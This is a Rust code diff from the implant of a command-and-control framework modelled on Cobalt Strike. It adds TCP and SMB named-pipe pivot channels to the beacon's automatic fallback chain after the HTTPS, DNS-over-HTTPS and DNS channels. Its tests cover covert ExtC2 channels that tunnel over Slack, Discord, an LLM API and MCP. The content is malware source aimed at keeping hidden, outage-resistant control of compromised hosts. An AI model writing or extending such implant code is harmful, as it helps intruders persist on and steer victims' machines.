@@ -298,14 +298,31 @@ pub unsafe fn dispatch_send_recv(
 
 /// Build-time fallback chain.
 ///
-/// The three HTTP-based channels form a natural degradation ladder: if the
+/// The first three entries are the HTTP-based degradation ladder: if the
 /// primary HTTPS endpoint is down, fall back to DoH (same TCP/TLS plumbing,
-/// different URI), then to plain DNS-over-HTTP. Beyond Dns, the remaining
-/// channels (SMB/Tcp/ExtC2) require operator-configured infrastructure
-/// (pipe names, pivot hosts, API tokens) and cannot be auto-selected — so
-/// exhausting the chain returns `None` and the beacon long-sleeps then
+/// different URI), then to plain DNS-over-HTTP — all three egress to
+/// `ctx.server_host` with no extra configuration.
+///
+/// Tcp and SmbPipe are appended as pivot fallbacks: both have real
+/// implant-side senders ([`tcp`]/[`smb`]) and only fire when the operator
+/// baked a peer/pipe into the build config — otherwise they fail fast at
+/// transaction time with a diag mark (`ERR_CH_TCP_NOPEER` /
+/// `ERR_CH_SMB_NOCONF`), so walking past an unconfigured pivot costs one
+/// cheap cycle before the chain exhausts. The four ExtC2 channels are
+/// deliberately NOT in the chain: they POST to the same `ctx.server_host`
+/// as Https (the provider fan-out happens server-side), so an Https
+/// outage implies an ExtC2 outage — they are operator-selected primaries
+/// (`SetChannel`), not automatic fallbacks.
+///
+/// Exhausting the chain returns `None` and the beacon long-sleeps then
 /// retries its primary, matching CS 4.10 fail-hold behaviour.
-const DEFAULT_FALLBACK_CHAIN: &[Channel] = &[Channel::Https, Channel::DohDns, Channel::Dns];
+const DEFAULT_FALLBACK_CHAIN: &[Channel] = &[
+    Channel::Https,
+    Channel::DohDns,
+    Channel::Dns,
+    Channel::Tcp,
+    Channel::SmbPipe,
+];
 
 /// The primary channel — the first element of the fallback chain. When the
 /// chain is exhausted the beacon resets to this so the next cycle retries
@@ -436,13 +453,50 @@ mod tests {
     fn next_fallback_walks_chain_then_exhausts() {
         assert_eq!(next_fallback(Channel::Https), Some(Channel::DohDns));
         assert_eq!(next_fallback(Channel::DohDns), Some(Channel::Dns));
+        // Pivot fallbacks trail the HTTP ladder (both have real senders and
+        // fail fast when unconfigured, so walking past them is cheap).
+        assert_eq!(next_fallback(Channel::Dns), Some(Channel::Tcp));
+        assert_eq!(next_fallback(Channel::Tcp), Some(Channel::SmbPipe));
         // Chain exhausted → None (caller long-sleeps and resets to primary).
-        assert_eq!(next_fallback(Channel::Dns), None);
-        // Channels outside the chain have no automatic fallback.
-        assert_eq!(next_fallback(Channel::Tcp), None);
         assert_eq!(next_fallback(Channel::SmbPipe), None);
+        // ExtC2 channels are operator-selected primaries, not automatic
+        // fallbacks — no chain entry, no implicit next.
         assert_eq!(next_fallback(Channel::SlackApi), None);
+        assert_eq!(next_fallback(Channel::LlmApi), None);
+        assert_eq!(next_fallback(Channel::Mcp), None);
+        assert_eq!(next_fallback(Channel::DiscordApi), None);
         assert_eq!(PRIMARY_CHANNEL, Channel::Https);
+    }
+
+    #[test]
+    fn fallback_chain_entries_are_real_no_dup_senders() {
+        // Every chain entry must have a real implant-side sender — a chain
+        // slot that can't emit a frame would silently burn a failover cycle.
+        for &ch in DEFAULT_FALLBACK_CHAIN {
+            assert!(ch.is_implemented(), "{ch:?} on the chain must send");
+        }
+        // No ExtC2 on the chain: they egress to the same server_host as
+        // Https, so they can't outlive an Https outage.
+        for &ch in DEFAULT_FALLBACK_CHAIN {
+            assert!(
+                !matches!(
+                    ch,
+                    Channel::SlackApi | Channel::LlmApi | Channel::Mcp | Channel::DiscordApi
+                ),
+                "{ch:?} shares Https's egress path — not a fallback"
+            );
+        }
+        // No duplicates: next_fallback resolves position() by first match,
+        // so a dup would make the tail of the chain unreachable.
+        for (i, &a) in DEFAULT_FALLBACK_CHAIN.iter().enumerate() {
+            assert!(
+                !DEFAULT_FALLBACK_CHAIN[i + 1..].contains(&a),
+                "duplicate {a:?} in fallback chain"
+            );
+        }
+        // The primary must be the chain head so chain-exhaustion resets
+        // retry the intended first transport.
+        assert_eq!(DEFAULT_FALLBACK_CHAIN.first(), Some(&PRIMARY_CHANNEL));
     }
 
     #[test]
@@ -594,5 +648,24 @@ mod tests {
         // No tcp_peer_host configured → None without touching the network.
         let ctx = testutil::ctx("127.0.0.1", 9);
         assert!(unsafe { dispatch_send_recv(&ctx, Channel::Tcp, b"x") }.is_none());
+    }
+
+    #[test]
+    fn dispatch_extc2_without_config_fails_fast() {
+        // No extc2_token/extc2_api_host configured → None without touching
+        // the network. This is the dispatcher-level gate SetChannel relies
+        // on: an unconfigured extc2 channel must never emit a request.
+        let ctx = testutil::ctx("127.0.0.1", 9);
+        for ch in [
+            Channel::SlackApi,
+            Channel::LlmApi,
+            Channel::Mcp,
+            Channel::DiscordApi,
+        ] {
+            assert!(
+                unsafe { dispatch_send_recv(&ctx, ch, b"x") }.is_none(),
+                "{ch:?} must fail fast when unconfigured"
+            );
+        }
     }
 }
